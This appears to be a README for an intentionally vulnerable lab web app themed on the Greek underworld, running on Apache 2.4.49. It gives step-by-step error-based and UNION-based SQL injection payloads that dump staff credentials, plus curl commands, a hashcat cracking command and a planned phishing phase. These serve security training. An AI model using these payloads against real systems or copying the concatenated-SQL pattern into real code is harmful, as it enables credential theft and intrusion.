# VictimWeb

Themed target web app for an **isolated** cybersecurity lab assessment
(Greek mythology / "House of Hades"), served by Apache 2.4.49 compiled
from source at `/opt/apache-2.4.49` on an Ubuntu VM.

> WARNING: Apache 2.4.49 is vulnerable (CVE-2021-41773 / CVE-2021-42013) and
> the pages below are intentionally vulnerable to SQL injection.
> Use only inside a host-only VM. Never expose it to the internet.

## Targets

Both pages query PostgreSQL with concatenated, non-parameterised SQL and
print raw DB errors, so **UNION-based and error-based** injection both work.

| Page | Query target | Extracts |
|---|---|---|
| `htdocs/login.html` + `cgi-bin/login.py` | `wardens` (staff auth) | All staff users via error-based injection (verbose DB errors) |
| `cgi-bin/admissions.py` | `souls` (public search) | Admissions records; `wardens` via UNION |

Valid login (after cracking the hashes): `charon` / `ferryman`.

## Layout

```
htdocs/     -> /opt/apache-2.4.49/htdocs/     (login.html)
cgi-bin/    -> /opt/apache-2.4.49/cgi-bin/     (login.py, admissions.py)
db/         run on the VM to build the PostgreSQL DB
deploy.sh   copies htdocs/ and cgi-bin/ into Apache and restarts
```

## Setup on the Ubuntu VM

```bash
git clone git@github.com:USERNAME/VictimWeb.git ~/VictimWeb
cd ~/VictimWeb
sudo ./deploy.sh          # web + CGI into Apache
sudo ./db/setup_db.sh     # PostgreSQL + data
```

Requires `mod_cgid` loaded in `httpd.conf` so the `.py` CGI scripts execute.

## Database

- PostgreSQL. DB `underworld`, app role `hades_app` / `styx` (over-privileged on purpose).
- Tables: `souls` (public records) and `wardens` (staff creds, md5, crackable).
- Driver: `python3-psycopg2` (installed by the setup script).

## SQL injection — login (error-based)

The login looks normal: it greets you on success, denies you on failure, and
**never shows a user table**. But the database prints raw errors, so you force
PostgreSQL to put the data *inside* an error message. All payloads go in the
**Keeper ID** field (passphrase: anything).

Why it works: the query is
`... WHERE username = '<you>' AND password_hash = md5('<pass>')`. If you make the
engine convert text to a number, the conversion fails and the error echoes the
offending text — so you fill that "text" with the data you want.

**1. Confirm the error leak**
```
'
```
Breaks the query → `unterminated quoted string`. If you see the error, it's exploitable.

**2. Prove the trick with something small (the version)**
```
' AND 1=CAST((SELECT version()) AS int)--
```
`invalid input syntax for type integer: "PostgreSQL 16.x ..."` — `CAST(text AS int)`
cannot convert, so PostgreSQL shows the text it tried to convert.

**3. Extract one user**
```
' AND 1=CAST((SELECT username FROM wardens LIMIT 1) AS int)--
```
Leaks `charon`.

**4. Extract every user at once (the goal)**
```
' AND 1=CAST((SELECT string_agg(username||':'||password_hash, ', ') FROM wardens) AS int)--
```
`string_agg` joins all rows into one string; the CAST dumps it into the error.
Every username and hash in a single message.

With curl:
```bash
curl -s http://localhost/cgi-bin/login.py \
  --data-urlencode "username=' AND 1=CAST((SELECT string_agg(username||':'||password_hash,', ') FROM wardens) AS int)--" \
  --data-urlencode "password=x"
```

Valid login (after cracking the hashes): `charon` / `ferryman`.

## SQL injection — admissions search (UNION-based)

The admissions page is a search that displays results, so UNION is realistic
here: you append a second SELECT and its rows appear in the results table.
Payloads go in the search box (or the `?q=` parameter).

Why it works: the query is `... WHERE full_name ILIKE '%<q>%'`. You close the
string and add `UNION SELECT`.

**1. Baseline**
```
sisyphus
```
One matching soul.

**2. Confirm injection**
```
'
```
Raw SQL error → exploitable.

**3. Find the column count** (UNION needs the same number of columns)
```
zzz' UNION SELECT NULL, NULL, NULL--
```
Works with three NULLs; two or four raise "each UNION query must have the same
number of columns". So the result has **3 columns**.

**4. Dump the staff credentials**
```
zzz' UNION SELECT username, email, password_hash FROM wardens--
```
`full_name ILIKE '%zzz'` matches nothing; the UNION appends every warden row to
the results table.

With curl:
```bash
curl -G "http://localhost/cgi-bin/admissions.py" --data-urlencode "q=sisyphus"
curl -G "http://localhost/cgi-bin/admissions.py" \
  --data-urlencode "q=zzz' UNION SELECT username, email, password_hash FROM wardens--"
```

## Cracking the hashes -> phishing

The `password_hash` values are md5 of weak words (on purpose). Crack them offline:
```bash
# one hash per line in hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
The recovered plaintext (e.g. `ferryman`) are the "harvested" credentials that
feed the fake-login phishing phase (assessment phase 3).

## Notes

- Deliberately insecure training material for a controlled, offline lab.
- The fake credential-harvesting clone of the login (assessment phase 3) is
  a separate page to be built later; this login is the original system.
